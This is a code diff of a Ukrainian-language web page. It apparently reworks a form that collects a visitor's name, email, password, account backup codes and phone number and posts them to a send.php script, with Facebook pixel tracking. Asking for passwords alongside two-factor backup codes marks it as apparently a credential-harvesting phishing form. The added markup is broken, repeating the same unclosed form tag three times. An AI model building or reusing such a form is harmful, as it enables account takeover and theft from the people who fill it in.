@@ -72,23 +72,20 @@ fbq('track', 'PageView');
             <div class="application-input">
               <input type="text" name="name" placeholder="Ваше Ім'я" required="">
             </div>
-                <div class="form-group">
-                  <label class="form-label">Введіть ваше Ім'я</label>
-                  <input type="text" name="n" class="form-control">
-                </div>
+               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="email" placeholder="Ваш Email" required="">
+            </div>
                 <!-- /.form-group -->
-                <div class="form-group">
-                  <label class="form-label">Введіть Email</label>
-                  <input type="text" name="email" class="form-control">
-                </div>
-                <div class="form-group">
-                  <label class="form-label">Введіть пароль</label>
-                  <input type="text" name="password" class="form-control">
-                </div>
-                <div class="form-group">
-                  <label class="form-label">Введіть резервні коди</label>
-                  <input type="text" name="codes" class="form-control">
-                </div>
+              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="password" placeholder="Ваш пароль" required="">
+            </div>
+              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="codes" placeholder="Ваші резервні коди" required="">
+            </div>
+             
                 <div class="form-group">
                   <label class="form-label">Введіть ваш номер телефону</label>
                   <input type="text" name="namber" class="form-control">
